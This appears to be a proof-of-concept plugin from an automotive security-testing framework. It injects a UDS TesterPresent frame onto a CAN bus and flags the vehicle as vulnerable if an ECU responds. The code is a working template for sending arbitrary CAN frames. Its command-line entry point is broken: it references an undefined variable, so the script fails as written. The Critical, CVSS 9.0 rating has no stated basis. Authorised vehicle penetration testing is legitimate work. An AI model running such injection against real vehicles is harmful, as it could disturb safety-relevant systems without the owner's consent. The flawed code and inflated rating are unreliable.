"""
PoC Name: CAN Message Injection
CVE: N/A
Component: Canbus Stack
Category: Canbus
Severity: Critical
CVSS: 9.0
Description: 注入UDS TesterPresent帧,验证CAN总线认证机制
Prerequisites: SocketCAN接口, python-can库, 授权测试环境。
Usage: python3 22_CAN_Message_Injection.py <can_interface>
"""
import sys
from iv_plugin_base import IVIVulnerabilityPlugin

class CANInjectionPlugin(IVIVulnerabilityPlugin):
    def check_prerequisites(self):
        return True

    def exploit(self):
        iface = self.params.get("can_interface", "can0")
        self.logger.info(f"CAN帧注入测试 ({iface})...")
        try:
            import can
            bus = can.interface.Bus(channel=iface, bustype="socketcan")
            # Inject a diagnostic request (UDS TesterPresent)
            test_msg = can.Message(
                arbitration_id=0x7DF,
                data=[0x02, 0x3E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
                is_extended_id=False
            )
            self.logger.info(f"注入帧: ID=0x7DF Data=02 3E 00 (TesterPresent)")
            bus.send(test_msg)
            resp = bus.recv(timeout=2.0)
            if resp:
                self.logger.warning(f"[+] 收到响应: ID={hex(resp.arbitration_id)} Data={resp.data.hex()}")
                self.results["vulnerable"] = True
                self.results["evidence"] = f"ECU responded to injected frame: {hex(resp.arbitration_id)}"
            else:
                self.logger.info("未收到ECU响应")
                self.results["vulnerable"] = False
            bus.shutdown()
        except ImportError:
            self.logger.error("python-can未安装")
            self.results["vulnerable"] = False
        except Exception as e:
            self.logger.error(f"CAN注入失败: {e}")
            self.results["vulnerable"] = False
        return self.results


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 22_CAN_Message_Injection.py <can_interface>")
        sys.exit(1)
    plugin = CANInjectionPlugin({"target_ip": "N/A", "can_interface": iface})
    plugin.run_verify()
